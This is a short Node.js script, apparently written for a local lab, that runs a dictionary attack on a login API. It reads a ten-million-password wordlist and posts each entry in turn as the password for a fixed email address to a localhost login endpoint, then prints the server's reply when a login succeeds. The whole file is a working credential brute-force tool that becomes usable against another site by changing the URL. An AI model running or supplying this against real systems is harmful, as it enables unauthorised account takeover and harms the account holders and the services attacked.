const fs = require("fs");
const  http = require("http")
let pass = fs.readFileSync("xato-net-10-million-passwords-1000000.txt","utf-8").split("\n")
let success = false
let i=0;
let length = pass.length
async function send(){
    let rdata= JSON.stringify({
        email:"rita@designer.com",
        password:pass[i]
    })
    let req = http.request("http://localhost:5000/api/user/login",{
        method:"post",
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': rdata.length
          }
        
    },(res)=>{
        let data=[]
        if(res.statusCode===200){
           
            res.on("data",data.push.bind(data))
            res.on("end",()=>{
               console.log( Buffer.concat(data).toString())
            })
        }else{
            if(++i<length){
                send()
            }
        }

    })
    req.end(rdata)
    req.on('error', error => {
        console.error(error)
      })
      console.log(rdata)
    }
    
    send()